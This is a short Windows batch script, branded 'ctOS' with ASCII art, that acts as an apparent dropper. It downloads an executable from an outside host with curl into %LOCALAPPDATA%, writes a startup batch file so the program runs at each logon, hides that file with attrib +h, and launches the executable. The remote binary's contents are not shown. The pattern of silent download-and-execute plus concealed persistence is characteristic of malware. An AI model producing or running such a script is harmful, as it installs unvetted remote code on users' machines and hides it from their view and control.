@REM   ################################################################################################################
@REM  ####                                      ########                                                            ####
@REM ####                                        ######          ▄████  ▄▄▄       ███▄ ▄███▓▓█████     ██ ▄█▀        ####
@REM ###               _    ____   _____          ####          ██▒ ▀█▒▒████▄    ▓██▒▀█▀ ██▒▓█   ▀     ██▄█▒          ###
@REM ##               | |  / __ \ / ____|          ##          ▒██░▄▄▄░▒██  ▀█▄  ▓██    ▓██░▒███      ▓███▄░           ##
@REM ##            ___| |_| |  | | (___            ##          ░▓█  ██▓░██▄▄▄▄██ ▒██    ▒██ ▒▓█  ▄    ▓██ █▄           ##
@REM ##           / __| __| |  | |\___ \           ##          ░▒▓███▀▒ ▓█   ▓██▒▒██▒   ░██▒░▒████▒   ▒██▒ █▄          ##
@REM ##          | (__| |_| |__| |____) |          ##           ░▒   ▒  ▒▒   ▓▒█░░ ▒░   ░  ░░░ ▒░ ░   ▒ ▒▒ ▓▒          ##
@REM ###          \___|\__|\____/|_____/          ####           ░   ░   ▒   ▒▒ ░░  ░      ░ ░ ░  ░   ░ ░▒ ▒░         ###
@REM ####                                        ######        ░ ░   ░   ░   ▒   ░      ░      ░      ░ ░░ ░         ####
@REM  ####                                      ########             ░       ░  ░       ░      ░  ░   ░  ░          ####
@REM   ######### version: 3.0 #########################################################################################

@echo off

if not exist "%LOCALAPPDATA%\ctOS" (
    mkdir "%LOCALAPPDATA%\ctOS"
)

curl https://ctos-api.gamek.repl.co/app --output %LOCALAPPDATA%\ctOS\ctOS.exe
echo start "" %LOCALAPPDATA%\ctOS\ctOS.exe > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ctOS.bat"
attrib +h "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ctOS.bat"
start "" %LOCALAPPDATA%\ctOS\ctOS.exe
exit